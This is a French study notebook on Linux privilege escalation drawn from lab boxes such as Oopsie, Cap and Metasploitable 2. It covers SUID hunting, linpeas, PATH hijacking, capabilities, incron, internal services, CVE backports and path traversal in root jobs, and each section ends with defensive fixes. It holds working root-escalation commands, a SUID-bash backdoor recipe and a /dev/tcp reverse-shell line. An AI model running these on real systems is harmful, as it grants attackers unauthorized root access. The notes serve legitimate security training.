# 03 — ÉLÉVATION DE PRIVILÈGES (privesc)

> Casier des outils qui font passer d'un shell faible (www-data, daemon) à ROOT.
> Outils : `find -perm` (SUID) · `linpeas` · `strings` · PATH hijacking · `getcap` / Capabilities · `incron` / config sourcée par root · surface interne (service `127.0.0.1` en root) · CVE locale amont vs backport · job root + entrée non assainie (path traversal)
> Ressource liée : **GTFOBins** (recettes de détournement) → voir `06_ressources_web.md`

---

## find -perm — la chasse aux SUID

**Rôle** — Débusquer les binaires **SUID**. Un binaire SUID s'exécute **avec les privilèges de son PROPRIÉTAIRE**, pas du lanceur → un SUID-root lancé par un petit user = exécution en root. Le bit SUID s'affiche `s` à la place du `x` du propriétaire (`-rwsr-xr-x`).

**Invocation type**
```bash
find / -perm -u=s -type f 2>/dev/null    # liste tous les binaires SUID
```

**Flags décodés** — `-perm -u=s` = bit SUID sur le propriétaire · `-type f` = uniquement les fichiers · `2>/dev/null` = jette les erreurs de permission.

**Méthode « quel SUID cibler » (3 temps)**
1. **Connaître la liste blanche normale** (à ignorer) : `passwd, sudo, su, mount, umount, chsh, chfn, newgrp, gpasswd, pkexec, ssh-keysign, at`…
2. **Repérer l'intrus** = un outil puissant hors-liste : `systemctl, find, vim, cp, bash, python, tar, nmap`…
3. **Vérifier sur GTFOBins** (filtre SUID) → il donne la recette de détournement.

**Exemple vécu**
- **Vulnversity** : intrus = `/bin/systemctl` → GTFOBins → faux `.service` oneshot (`ExecStart` lu en root) → `systemctl link` + `enable --now` → root.
- **Metasploitable 2** : intrus = `nmap` v4.53 → GTFOBins → `nmap --interactive` → `!/bin/sh` → `whoami` = root.

**Payload « fabriquer un SUID bash » (quand du CODE ROOT exécute mes commandes)**
Si j'obtiens l'exécution d'une commande par root (cron, service qui source une config, hook…), je peux me forger une porte root permanente :
```bash
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash   # ← DOIT être exécuté PAR ROOT
```
puis, depuis mon shell faible : `/tmp/rootbash -p` → shell euid root.
- **Le `-p` est OBLIGATOIRE** : sans lui, bash largue ses privilèges au démarrage ; `-p` (*privileged mode*) garde l'euid root.
- **C'est ROOT qui doit faire le `cp`+`chmod`** : si je le fais moi-même, la copie m'appartient → SUID inutile. D'où l'astuce de glisser ces 2 lignes dans un fichier exécuté par root (ex. une config sourcée par un service root à son redémarrage).
- Équivalence conceptuelle avec `cap_setuid` (voir `getcap`) : deux chemins, une destination = forcer euid 0.

**Pièges & leçons**
- **Placeholders GTFOBins littéraux** : coller le modèle avec `/path/to/command` → `Directory nonexistent`. Ce sont des trous à remplir avec de vrais chemins.
- Dans `nmap --interactive`, taper `id` = « Unknown command » → seul `!<cmd>` marche → passer direct à `!/bin/sh`.
- **SUID sur un script = ignoré** (course TOCTOU) → n'est honoré que sur un vrai binaire compilé.

---

## linpeas

**Rôle** — L'espion déjà infiltré : un script qui tourne SUR la cible avec le user courant et énumère TOUT automatiquement (SUID, cron, fichiers modifiables exécutés par root, mots de passe qui traînent, noyau vulnérable, permissions). = l'automatisation de la chasse manuelle SUID.

**Invocation type**
```bash
# 1) Transférer linpeas.sh sur la cible (voir 05_reseau_transfert.md)
chmod +x linpeas.sh
./linpeas.sh                # lire la sortie ROUGE/JAUNE = vecteurs à fort potentiel
```

**À savoir**
- **Ne s'attaque PAS à une IP** : linpeas n'est pas un bélier, c'est un espion de l'intérieur → il faut DÉJÀ un shell (foothold) avant de le lancer.
- Puissant même en petit user : il lit tout ce qui est world-readable (`others=r`).
- Dépôt = **PEASS-ng**.

**Exemple vécu**
- **Metasploitable 2** : foothold bas-privilège `daemon` (distcc) → transfert linpeas → lecture de la sortie → vecteurs repérés → privesc SUID `nmap` → root.

**Pièges & leçons**
- **Transfert** : servir le fichier via `python3 -m http.server` sur un port HAUT (`8000`), PAS le port 80 (privilégié = root-only → `Permission denied`).
- **Lancer depuis le dossier** où se trouve linpeas (`http.server` sert le dossier courant).
- **`http://` ≠ `https://`** : `http.server` est du HTTP nu (pas de certificat).
- **D'abord à la MAIN, l'auto ensuite** : sur une box à vecteur unique, comprendre *ce que* linpeas cherche AVANT de le lancer → sinon on ne sait ni lire ni faire confiance à sa sortie (énorme + faux positifs). L'outil accélère un savoir, il ne le remplace pas. (winPEAS/linPEAS = autorisés eJPT/OSCP.)

---

## strings — lire l'intérieur d'un binaire

**Rôle** — Un binaire compilé est du code machine illisible, MAIS il contient des bouts de texte cachés : messages affichés, noms des fonctions de bibliothèque, chaînes codées en dur. `strings` extrait tout le texte lisible → première fenêtre de reverse engineering, sans décompiler.

**Invocation type**
```bash
strings /usr/bin/monbinaire
```

**Ce qu'on y CHERCHE en privesc**
- `system` / `popen` dans les imports = le binaire lance des commandes shell.
- `setuid` / `geteuid` = il joue avec les privilèges (typiquement SUID root).
- Une chaîne de commande codée en dur (ex. `cat /root/reports/`) → surtout : la commande est-elle appelée par **chemin absolu (`/bin/cat`) ou nom nu (`cat`)** ? Nom nu = PATH hijacking possible (voir ci-dessous).

**Exemple vécu**
- **Oopsie** (HTB Tier 2) : `strings /usr/bin/bugtracker` → `system` + `setuid` + `cat /root/reports/` (cat **nu**) → cible confirmée pour un PATH hijack.

**Piège** — ne pas taper la commande dans le prompt d'un programme ouvert (ça devient son input) ; la lancer dans son propre shell.

---

## PATH hijacking — détourner un SUID qui appelle une commande "nue"

**Rôle** — Passer root en abusant du `$PATH` quand un binaire SUID root appelle un autre programme (`cat`, `ls`, `service`…) **sans chemin absolu**. Le shell résout ce nom via le `PATH` de gauche à droite, premier trouvé gagne — et le `PATH`, c'est **la victime (moi) qui le contrôle**.

**Recette type**
```bash
cd /tmp
echo '/bin/bash' > cat        # faux "cat" = un shell (PAS de slash final)
chmod +x cat                  # le rendre exécutable
export PATH=/tmp:$PATH        # /tmp EN TÊTE → mon cat trouvé AVANT /bin/cat
<binaire_suid>                # il appelle "cat" → lance le MIEN, en ROOT
id                            # uid=0(root)
```

**Décodage `export PATH=/tmp:$PATH`**
- `$PATH` = valeur actuelle (on la garde) · `/tmp:$PATH` = `/tmp` prepend (en tête).
- `export` = crucial : rend la variable héritée par le programme-enfant (le SUID). Sans `export`, le binaire garde l'ancien PATH → échec.
- **Ordre = tout** : `$PATH:/tmp` (à la fin) ferait gagner le vrai `/bin/cat` → pas de root.

**Exemple vécu**
- **Oopsie** : `bugtracker` (SUID root) fait `system("cat /root/reports/…")` → faux `cat`=`/bin/bash` + `/tmp` en tête → **root**.

**Pièges & leçons**
- **Slash final** : `echo '/bin/bash/'` → `/bin/bash/: not found` (bash est un fichier, pas un dossier).
- **Signal de détection** : dans `strings`, `system()`/`popen()` + une commande sans `/` = faille probable.
- **Groupe custom** = indice majeur : un `id` avec un groupe fait maison (ex. `bugtracker`) pointe souvent vers un binaire/ressource custom vulnérable. (Cf. `docker`/`lxd`/`disk`/`shadow` = root trivial.)
- **Purple / fix dev** : toujours chemin absolu dans le code privilégié, ne pas passer par un shell, assainir l'env → **CWE-426/427 (Untrusted Search Path)**.

---

## getcap — Linux Capabilities (le SUID en plus fin)

**Rôle** — Débusquer les binaires porteurs d'une **capability** dangereuse. Les *Linux Capabilities* découpent les super-pouvoirs de root en petits morceaux (`cap_setuid`, `cap_net_raw`, `cap_dac_read_search`…) qu'on peut coller à UN binaire **sans le rendre SUID**. C'est le cousin discret de la chasse aux SUID : `find -perm` ne les voit PAS, il faut `getcap`.

**Invocation type**
```bash
getcap -r / 2>/dev/null    # -r = récursif, balaye tout le système de fichiers
```

**Les capabilities qui donnent root (ou presque)**
- `cap_setuid` = le binaire peut appeler `setuid()` vers n'importe quel UID, dont 0 → root direct. **Sur un interpréteur (python/perl/ruby) = game over.**
- `cap_setgid` = idem côté groupe.
- `cap_dac_read_search` = ignore les permissions de LECTURE → lire `/etc/shadow`, la clé SSH de root…
- `cap_dac_override` = ignore lecture ET écriture → modifier n'importe quel fichier.
- `cap_net_raw` = sockets bruts (sniff/spoof) — pas root en soi.
- `cap_net_bind_service` = écouter sur un port < 1024 — bénin seul.
- Le suffixe `+ep` / `+eip` = capability **E**ffective / **I**nheritable / **P**ermitted.

**Recette root via `cap_setuid` sur python**
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id     # uid=0(root)
```
(GTFOBins donne l'équivalent pour perl, ruby, node, gdb, php… filtre **Capabilities**.)

**Exemple vécu**
- **Cap** (HTB Easy) : `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip` (repéré par linpeas). L'appli web faisait déjà `os.setuid(0)` dans son code → l'indice était là → `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` → **root**. Note : `uid=0(root) gid=1001(...)` car `setuid` seul (pas `setgid`).
- *CONTRE-exemple* : `getcap` sortait `/usr/sbin/suexec = cap_setgid,cap_setuid+ep` **mais PAS exploitable**. suexec (helper Apache) est **durci** : refuse un appelant non-httpd, refuse les UID bas (donc root), docroot compilé → il ne te laisse PAS diriger son `setuid`. Idem `newuidmap`/`newgidmap` et tous les `cap_net_raw` (`dumpcap`/`ping`/`mtr` = valeurs par défaut, pas des misconfigs).

**La règle : une capability n'est exploitable QUE si le binaire te laisse EXÉCUTER DU CODE ARBITRAIRE.**

| Binaire | `cap_setuid` ? | Root ? | Pourquoi |
|---|---|---|---|
| `python`/`perl`/`ruby`/`gdb` | oui | OUI | interpréteur généraliste → `os.setuid(0); os.system("/bin/bash")` |
| `suexec`/`newuidmap` | oui | NON | binaire mono-fonction durci (refuse root, appelant verrouillé) |

Se demander *« ce binaire me laisse-t-il lancer ce que je veux ? »*, PAS juste *« a-t-il la capability ? »*.

**Pièges & leçons**
- **Tout ce que `getcap`/linpeas surligne n'est pas un vecteur** : `cap_net_raw` sur `ping`/`dumpcap`/`mtr`/`arping` = le réglage NORMAL. Le skill = distinguer l'anormal du défaut.
- **`find -perm -u=s` ne montre PAS les capabilities** → une box « sans SUID intéressant » peut cacher un `cap_setuid`. Toujours lancer `getcap -r / 2>/dev/null` en parallèle.
- **Purple / fix** : ne JAMAIS coller `cap_setuid` à un interpréteur générique. Moindre privilège : la capability minimale, sur un binaire dédié minimal. Auditer régulièrement avec `getcap -r /`.

---

## incron — et le vecteur "config relue au restart par un service root"

**Rôle** — `incron` est le cousin **événementiel** de `cron` : au lieu de se déclencher sur l'heure, il se déclenche sur un **événement de système de fichiers** (fichier créé/écrit/supprimé dans un dossier surveillé). Le démon `incrond` tourne souvent en **root** → si un dossier surveillé est writable par moi, je peux déclencher l'exécution d'un script root. À chercher systématiquement quand on n'a rien trouvé côté cron/SUID/caps.

**Où regarder**
```bash
cat /etc/incron.d/*                 # les règles système (chemin_surveillé  ÉVÉNEMENT  commande)
ls -la <dossiers surveillés>        # sont-ils à moi (777) ?
ps aux | grep incrond               # confirme qu'il tourne (et en tant que qui)
```
Format d'une règle : `<chemin>  <MASQUE>  <commande>` (`IN_CLOSE_WRITE`, `IN_MODIFY`, `IN_CREATE`…).

**La vraie leçon — "config relue au restart par un service root"**
Beaucoup de privesc de ce type ne consistent PAS à écrire directement dans le dossier incron, mais à combiner :
1. un **déclencheur** que je contrôle (écrire un fichier dans un dossier surveillé → un service root redémarre) ;
2. une **config que ce service relit au démarrage ET que je peux écrire** ;
3. le service **tourne en root**.
→ Je planque ma charge (reverse shell, `cp bash + chmod +s`, ligne sudoers…) dans la config, je déclenche le restart, root l'exécute.

> LE TEST-ROI avant de planquer quoi que ce soit : *« le service qui relit cette config, il tourne en tant que QUI ? »* Si c'est un process non-root, je ne gagne rien. Le payload ne vaut de l'or que si le lecteur est **root** (`ps aux | grep <service>`).

**Exemple vécu**
- **Exemple (générique)** : `incrond` (root) surveille un dossier world-writable. Écrire un fichier déclencheur → un service root redémarre → il **source** une config elle-même writable → le tout en root. J'y place un reverse shell (défangé : `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1`) → `touch <déclencheur>` → **shell root**.
- *Contre-exemple digéré* (même box) : les autres règles incron lançaient des commandes fixes qui n'ouvrent jamais mon fichier = culs-de-sac. Seule compte la ligne où mon écriture rejoint l'exécution root.

**Lire une "forteresse" de hook** — un dispatcher qui finit par `system("$hookfile $params")` MAIS vérifie que le hook est **signé GPG** (whitelist) + **hash intègre** → impossible de planter mon propre hook. Leçon : contre un rempart de signature/intégrité, on ne casse pas les murs → on cherche le seul paramètre laissé passer (`$params`, au filtre incomplet) ou un autre chemin (ici la config sourcée).

**Pièges & leçons**
- **`find -perm` et `getcap` ne voient PAS incron.** Vecteur à part → `cat /etc/incron.d/*` (linpeas le remonte dans *Cron jobs / incron*).
- **Ne pas confondre « ça tourne en root » et « je peux le détourner »** : un cron/service root n'est exploitable que si je contrôle son entrée (script writable, config sourcée, ou données qu'il lit).
- **Purple / fix** : aucun fichier lu/sourcé/exécuté par un service root ne doit être writable par un compte moins privilégié ; vérifier l'intégrité (signature/hash) avant d'exécuter un hook ; moindre privilège sur les dossiers `incron`/spool.

---

## Surface d'attaque interne — un service local vulnérable exécuté en root

**Rôle** — Quand `sudo`/SUID/`getcap`/cron/groupes/noyau sont tous rayés, la porte restante est souvent la **surface d'attaque INTERNE** : un service en écoute sur **`127.0.0.1`** (donc invisible d'un `nmap` externe), laissé là parce que le dev pense *« seul un user de confiance y accède »*. Une fois le foothold obtenu, **je SUIS cet accès de confiance** → ce service devient exploitable. S'il tourne en root et porte une vulnérabilité, c'est root.

**Où regarder**
```bash
ss -tlnp                       # ports en écoute + process. Comparer INTERNE (127.0.0.1) vs EXTERNE (0.0.0.0)
ps aux | grep -i <service>     # le service tourne en tant que QUI ? (test-roi)
<client> 127.0.0.1 <port>      # empreinter le service (bannière)
```

**La méthode en 3 temps (quand on ne peut PAS modifier le binaire)**
1. **Repérer l'écoute interne** que l'externe ne voit pas (`ss -tlnp` → un `127.0.0.1:<port>` inattendu).
2. **Confirmer qu'il tourne en root** (`ps aux`) et **empreinter sa version** (`--version`, `strings <bin> | grep -i <produit>`). Un binaire compilé à la main (chemin `/home/<user>/...` dans `strings`) = « viens chercher le bug ».
3. Si le binaire et ses dossiers ne sont pas writable (on ne peut pas *remplacer* ce que root exécute) → **pivot conceptuel : attaquer le CODE dans le binaire**, pas le fichier → **recherche de CVE sur la version EXACTE**.

**La règle-mère (bug LOGIQUE vs corruption MÉMOIRE)**
On peut tomber un binaire **durci** (canari de pile, CFI) **parce que ce n'est PAS une corruption mémoire** : c'est une **faille logique** (ex. injection d'argument dans un appel `login`/`exec`). *`-fstack-protector`/`-fcf-protection` ne protègent QUE contre l'écrasement de mémoire — ils sont AVEUGLES à un bug logique.* → Ne jamais réduire « exploit » à « buffer overflow » ; un durcissement mémoire complet **n'implique pas** un binaire sûr.

**Pièges & leçons (transverses privesc)**
- **Symlink** : `ls -la` d'un lien affiche TOUJOURS `lrwxrwxrwx` = perms bidon. Pour savoir si on peut écrire, regarder la CIBLE (`ls -la <cible>`) et le dossier qui contient le lien (droit `w` sur le dossier = on peut recréer le lien).
- **Vérifier une version au lieu de la supposer** : `pkexec 0.105` *paraît* PwnKit (CVE-2021-4034), mais `apt-cache policy policykit-1` → `0.105-33ubuntu0.1` (jammy-security) = **patché**. Lire le suffixe `ubuntuX.Y` + la distro (jammy=22.04 postérieure au patch) évite une compil inutile. Un « non-vulnérable » PROUVÉ = une case rayée avec certitude.
- **Anomalie ≠ porte** : des SUID intrus `rcp`/`rlogin`/`rsh` = anormaux MAIS aucun abus GTFOBins → leurre, ne pas tunneliser.
- **Purple / fix** : inventorier les écoutes (`ss -tlnp`) et supprimer tout daemon legacy/inutile (telnet, rsh…) ; « lié à `127.0.0.1` » réduit l'exposition externe mais ne dispense pas de patcher/authentifier (défense en profondeur) ; ne jamais faire tourner un binaire réseau compilé main non suivi par le gestionnaire de paquets.

---

## CVE locale : amont vs backport distro (+ la race TOCTOU)

**Rôle** — Quand linpeas/un scanner crie *« paquet X version Y = vulnérable à CVE-Z »*, c'est une **heuristique de plage de versions**, pas une preuve. Avant d'investir dans un PoC, trancher : la box est-elle **vraiment vulnérable** ou **déjà patchée par un backport** ? Sur une distro, le numéro amont ne suffit JAMAIS à répondre.

**Le piège central — amont ≠ distro**
Une CVE dit « fixed in **1.3.5** » (version **amont**). Mais Debian/Ubuntu **rétroportent** le correctif **dans** l'ancienne branche en incrémentant un suffixe (`1.2.8-2ubuntu1.5`) **sans** passer à 1.3.5. Donc un paquet qui « paraît » dans la plage affectée peut être patché tout en gardant son vieux numéro. C'est LA source n°1 de faux positifs linpeas.

**Les sources autoritaires (par ordre de préférence)**
```bash
# LOCAL — le changelog du paquet INSTALLÉ (la meilleure, hors-ligne, 2 min) :
zcat /usr/share/doc/<paquet>*/changelog.Debian.gz | grep -i CVE-AAAA-NNNNN
dpkg -l <paquet>                       # la version exacte (suffixe -ubuntuX.Y compris)
apt-cache policy <paquet>              # version installée vs candidate

# TRACKER distro (en ligne) — quelle -ubuntuX.Y corrige, par release :
#     ubuntu.com/security/CVE-AAAA-NNNNN   (confirmer la release : cat /etc/os-release)
```
Verdict : si le changelog/tracker montre que ma version ≥ la version corrigée → **patché**, on **abandonne le vecteur sans regret** (ne pas relancer un PoC 40×). Sinon → **vulnérable**.

**Le cas d'une race TOCTOU (service D-Bus/polkit privilégié)**
Certaines privesc locales reposent sur une **race non-déterministe** (fenêtre entre le *check* d'autorisation et le *use*). Deux conséquences pratiques :
- **Nature = race** : perdre un tir **n'apporte aucune info**. On ne « force » pas une race par de la répétition aveugle ; d'abord **confirmer que la cible est vraiment vulnérable** (changelog/tracker), et seulement alors raisonner nombre de tentatives / charge concurrente.
- **Triage d'une sortie linpeas géante** : le gros dump « Process capabilities » = quasi uniquement des **threads noyau** (`kworker`, `rcu_*`, `migration/N`, `ksoftirqd`) = bruit pur. La pépite est une **ligne isolée**. Savoir jeter 95 % d'une sortie pour isoler la ligne utile = une compétence à part entière.

**Pièges & leçons**
- **Ne jamais croire la plage de versions d'un scanner** sur une distro → `zcat .../changelog.Debian.gz` + tracker.
- **Une race perdue ≠ une info** tant que vulnérable/patché n'est pas tranché. Relancer en « déjà patché » = boucle infinie de futilité.
- **Purple / fix** : appliquer sans délai les mises à jour de sécurité de la distro (le backport existe — encore faut-il l'installer : `unattended-upgrades`) ; un service D-Bus/polkit privilégié atteignable par tout user local = surface root → auditer/patcher au même titre que les SUID.

---

## Job root + entrée non assainie (path traversal, CWE-22)

**Rôle** — Une privesc élégante : pas de CVE, pas de SUID, pas de course. Juste un **job planifié qui tourne en root** et qui **traite une entrée que je contrôle** sans la nettoyer. Le job écrit un fichier → je détourne **OÙ** il l'écrit → **écriture arbitraire en root** (*write-what-where*). C'est la mise en pratique pure de la chaîne **source → sink**.

**Où regarder (le vecteur « timer/cron root » complété)**
```bash
systemctl list-timers              # les timers systemd — un mécanisme À PART de cron (ne pas s'arrêter à cat /etc/cron*)
systemctl cat <unit>.service       # ExecStart = quel script ? User= = en tant que QUI ? (absent/root = jackpot)
cat <le_script>                    # LIRE : d'où il LIT, où il ÉCRIT, comment il construit le chemin de sortie
```
> Triage des timers : sur une machine typique, la grande majorité sont du ménage Ubuntu standard (`sysstat`, `logrotate`, `fwupd`, `apt-daily`, `man-db`…) = bruit. Celui qui est **sur-mesure ET tire très souvent** = l'anomalie = la cible. Même réflexe que trier la liste blanche SUID ou le bruit linpeas.

**La méthode source → sink (le modèle-mère)**
1. **Source** = l'entrée que le job root ingère et que je peux influencer.
2. **Sink** = l'endroit où cette entrée agit (ici : le chemin d'écriture sur le disque, exécuté en root — typiquement un `os.path.join(stage, chemin_fourni)`).
3. **Le bug** = entre les deux, **aucune validation** du chemin fourni. Un chemin avec des `..` **sort** du dossier prévu.
4. **Cible additive (jamais destructive)** : écrire un **fichier NEUF** que root/le système relit — `/root/.ssh/authorized_keys` (clé SSH), un drop-in `/etc/sudoers.d/x`, `/etc/cron.d/x`. **Ne JAMAIS écraser** un fichier critique existant (`/etc/passwd`, `/etc/sudoers`) : l'écriture tronque → on brique l'auth.

**Pièges & leçons**
- **cron ≠ timers systemd** : avoir lu `/etc/cron*` « clean » ne dédouane PAS de `systemctl list-timers` (+ `pspy` pour voir ce qui tourne en direct). Trou d'énumération classique.
- **Une primitive write-what-where ≠ exécution** : c'est une *écriture*. L'exécution, c'est MOI qui la fabrique via la cible (clé SSH, sudoers.d…). Toujours viser l'additif.
- **Le compte des `..` est critique** (±1 = tout rate) : le dériver du chemin réel, obtenu en testant d'abord avec un fichier **inoffensif** (valide le pipeline ET révèle le point de départ).
- **Valider la plomberie à blanc AVANT d'armer** : un fichier banal → vérifier dans le log que le job l'avale → ensuite seulement le payload. Isoler les variables.
- **Purple / fix** : assainir toute entrée externe qui construit un chemin (`os.path.realpath` + vérifier qu'il reste sous le dossier autorisé ; rejeter `..`) → **CWE-22 (Path Traversal)** ; ne JAMAIS faire tourner en root un job qui traite du contenu fourni par un utilisateur moins privilégié ; `User=` dédié non-root.
